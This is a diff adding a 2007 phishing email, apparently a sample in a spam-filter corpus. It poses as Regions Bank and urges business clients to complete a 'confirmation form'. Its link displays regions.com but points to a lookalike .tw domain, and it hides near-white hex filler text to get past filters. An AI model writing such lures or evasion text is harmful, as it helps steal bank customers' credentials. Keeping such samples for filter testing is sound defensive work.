@@ -1,0 +1,59 @@
+From nobody Sun Jan 25 13:50:04 2015
+Return-Path: <corporateservice.refxx8958281h.cm@regions.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 03774468C9
+ for <user@login.example.com>; Fri, 15 Jun 2007 00:58:24 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id CC43A131FB9E
+ for <user@example.com>; Fri, 15 Jun 2007 00:58:23 -0400 (EDT)
+Received: from adsl-ull-40-221.41-151.net24.it
+ (adsl-ull-40-221.41-151.net24.it [151.41.221.40])
+ by mail.example.org (Postfix) with SMTP id 627B16FA1C4
+ for <user@example.com>; Fri, 15 Jun 2007 00:58:21 -0400 (EDT)
+Received: from [127.106.105.164] (HELO bayed.hot.ee)
+ by adobe.com with SMTP id SPI3AYYPVN
+ for <user@example.com>; Thu, 14 Jun 2007 21:58:23 -0800
+From: "Regions bank" <corporateservice.refxx8958281h.cm@regions.com>
+To: user <user@example.com>
+Subject: Customer Notification: Data Confirmation! (message id: H379773973YH)
+X-Accept-Language: en-us, en
+User-Agent: Calypso Version 3.20.01.01 (4)
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--K18.GDE7X598RY9S.T8.AZU"
+Message-Id: <20070615045821.627B16FA1C4@mail.example.org>
+Date: Fri, 15 Jun 2007 00:58:21 -0400 (EDT)
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1400
+
+----K18.GDE7X598RY9S.T8.AZU
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta  http-equiv="Content-Type"     content="text/html;  charset=iso-8859-1"   />
+</head>
+
+<body>
+<p><font      face="Arial">Dear     business       client  of <b>Regions       Bank</b>:</font></p>
+<p><font      face="Arial">The   Regions   Customer      Service requests      you  to    complete  the   Regions InterAct      Confirmation       Form.</font></p>
+<p><font   face="Arial">This     procedure      is  obligatory  for  all business   and   corporate     clients   of Regions     Bank.</font></p>
+<p><font   face="Arial">Please  select   the       hyperlink and visit  the    address      listed to     access   the   Regions     InterAct     Confirmation   Form.</font><br>
+</p><p><font  face="Arial"><a   href="http://interactsession-23630.regions.com.prdir.tw/ibsregions/cmserver/iform.cfm">http://interactsession-23630.regions.com/ibsregions/cmserver/iform.cfm</a></font></p>
+<p><font    face="Arial">Again,      thank    you     for      choosing   Regions     Bank      for    your     business    needs. We    look     forward to  working    with    you.</font></p>
+<p><font  face="Arial">***** Please  do   not   respond     to    this      email      *****</font></p><p><font     face="Arial">This mail      is      generated     by   an       automated    service.<br>
+Replies     to   this    mail  are      not    read      by   Regions Bank  customer    service or    technical     support.</font><br></p>
+<p>.</p>
+<p><font     color="#FFFFF6" face="Arial">0x77594150, 0x3, 0x64170801, 0x7414, 0x00, 0x121, 0x01, 0x93251871, 0x87886960, 0x64419058, 0x59942898 include, EKI, 95D 0x26471504, 0x68053435, 0x46      0x236, 0x86, 0x75955991, 0x6524, 0x42919286, 0x86855533, 0x6, 0x98088236, 0x4      common: 0x73, 0x89146582, 0x09, 0x102, 0x0, 0x9843       3BW: 0x1, 0x5, 0x90, 0x979, 0x31, 0x994       exe: 0x84, 0x159, 0x6006, 0x98, 0x9464, 0x8, 0x0996, 0x06461017, 0x4, 0x84, 0x8, 0x5, 0x8, 0x2460     media: 0x81171944, 0x8881, 0x36409063, 0x120, 0x51, 0x98181640     NE4: 0x5, 0x8, 0x38, 0x59701130, 0x21184573, 0x72, 0x09, 0x931, 0x07153056, 0x799, 0x7233</font></p><p><font   color="#FFFFF0"      face="Arial"><span>0x28, 0x189, 0x5    0x63, 0x8, 0x1340, 0x6, 0x6, 0x2, 0x53072000, 0x0085    0x18565144, 0x8860, 0x826, 0x602    WMCB, interface, M04C, PCJ, revision, 543, common   JHT: 0x2, 0x83023898, 0x51308772, 0x34, 0x130, 0x1, 0x20912501, 0x3013, 0x99557848, 0x2, 0x69844415, 0x6, 0x118     0x158, 
+ 0x49, 0x0241, 0x4, 0x5160, 0x363, 0x7373, 0x6, 0x320, 0x30143251    </span><span>4TP, S8N, G1D    media: 0x9395, 0x74, 0x83624123, 0x002  file: 0x30, 0x317, 0x6758, 0x56039002, 0x1688, 0x4, 0x9, 0x89, 0x07, 0x75106563, 0x5179   DO6: 0x06, 0x8, 0x8804, 0x23422630, 0x26276803, 0x0, 0x89759005, 0x3468, 0x6, 0x659, 0x55253981, 0x921, 0x73033947</span></font></p>
+<p><font     color="#FFFFF7"    face="Arial"><span>0x010, 0x3255, 0x57     api: 0x10, 0x54407160, 0x771, 0x9, 0x97419819    function: 0x61861323, 0x98327806, 0x2, 0x88897500, 0x6, 0x5, 0x546, 0x59006660, 0x72, 0x258, 0x643, 0x84933885, 0x813    revision: 0x97, 0x67, 0x5900, 0x846  UB4 EYE KJ89 common JSKA serv XN5L revision media</span><span>WT2: 0x1422, 0x1, 0x15301597, 0x5987, 0x9124, 0x75, 0x9, 0x22076049      </span><span>0x46674500, 0x0430, 0x52097526, 0x20873272, 0x452, 0x4725, 0x483, 0x04, 0x2996, 0x6, 0x581, 0x9705, 0x310, 0x3577, 0x97    0x0122    dec define interface YNM IG8 api 2LN6 create.       rev: 0x04, 0x0</span></font></p>
+</body>
+</html>
+
+
+----K18.GDE7X598RY9S.T8.AZU--
